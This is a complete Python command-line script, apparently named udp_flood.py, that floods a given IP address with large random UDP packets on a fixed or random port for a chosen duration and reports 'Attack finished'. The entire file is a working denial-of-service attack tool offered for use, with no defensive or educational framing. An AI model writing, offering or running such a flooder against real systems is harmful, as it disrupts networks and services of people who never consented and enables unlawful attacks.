#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import sys
import time

def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(65500)
    end_time = time.time() + duration if duration > 0 else float('inf')

    while True:
        if time.time() < end_time:
            dest_port = random.randint(1, 65535) if port == 0 else port
            sock.sendto(bytes_to_send, (ip, dest_port))
        else:
            break

    print('Attack finished')

def main():
    if len(sys.argv) < 4:
        print('Usage: udp_flood.py <IP> <port> [duration]')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    if port < 0 or port > 65535:
        print("Error: Port must be between 0 and 65535.")
        sys.exit(1)

    if duration < 0:
        print("Error: Duration cannot be negative.")
        sys.exit(1)

    udp_flood(ip, port, duration)

if __name__ == "__main__":
    main()
